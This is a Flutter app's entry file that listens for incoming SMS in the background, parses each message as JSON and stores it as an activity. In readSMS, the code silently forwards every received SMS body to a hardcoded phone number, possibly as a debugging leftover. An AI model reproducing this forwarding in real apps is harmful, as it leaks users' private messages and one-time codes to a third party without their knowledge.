import 'package:app/models/order.dart';
import 'package:app/routes.dart';
import 'package:app/services/database.service.dart';
import 'package:flutter/material.dart';
import 'package:telephony/telephony.dart';
import 'constants/themes.dart';
import 'dart:convert';

readSMS(SmsMessage sms) {
  Telephony.instance
      .sendSms(to: "9327619673", message: sms.body ?? ""); // print(message.)
  final map = JsonDecoder().convert(sms.body ?? "");
  final act = Activity.fromMap(map);
  DatabaseService.databaseService.insertActivity(act);
}

onNewMessage(SmsMessage message) async {
  readSMS(message);
}

onBgMsg(SmsMessage message) async {
  readSMS(message);
}

void main() {
  WidgetsFlutterBinding.ensureInitialized();

  final Telephony telephony = Telephony.instance;
  telephony.listenIncomingSms(
      listenInBackground: true,
      onNewMessage: onNewMessage,
      onBackgroundMessage: onBgMsg);
  runApp(MyApp());
}

class MyApp extends StatelessWidget {
  MyApp({Key? key}) : super(key: key);

  // This widget is the root of your application.
  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'Flutter Demo',
      theme: ThemeData(
        textTheme: AppTheme.textTheme,
      ),
      onGenerateRoute: onGenerateRoute,
      initialRoute: AllRoutesConstants.login,
    );
  }
}
